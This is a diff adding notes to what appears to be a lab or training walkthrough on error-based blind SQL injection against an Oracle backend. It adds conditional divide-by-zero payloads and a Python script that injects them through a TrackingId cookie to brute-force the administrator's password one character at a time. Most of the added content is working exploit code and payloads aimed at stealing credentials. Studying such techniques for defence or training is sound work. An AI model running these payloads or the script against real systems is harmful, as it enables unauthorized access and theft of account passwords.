@@ -116,5 +116,38 @@ Payload 2: brute force
 
 ![image](https://user-images.githubusercontent.com/115911041/234780398-d96fd0c5-909d-4f1e-aa4b-5791c3fcb72f.png)
 
+# Script python
 
+Password LENGTH
+
+`'|| (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM <TABLE> WHERE <Column> = '...')||'`
+
+Password BruteForce
+
+`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+```
+import requests
+import string
+
+characters = list(string.ascii_lowercase)
+characters += list(string.digits)
+url = "" 
+length = 20
+result = ''
+
+print("[+] Extract Info")
+
+for i in range(1, length+1):
+    for char in characters:
+        payload = "a'||(SELECT CASE WHEN SUBSTR(password,%i,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" %(i, char)
+        print("Tring Number %i with: " %(i), char)
+        cookie = {"TrackingId":payload}
+        response = requests.get(url, cookies=cookie)
+        if response.status_code == 500:
+            result += char
+            break
+
+    print("[+] Result is : ", result)
+    ```
 
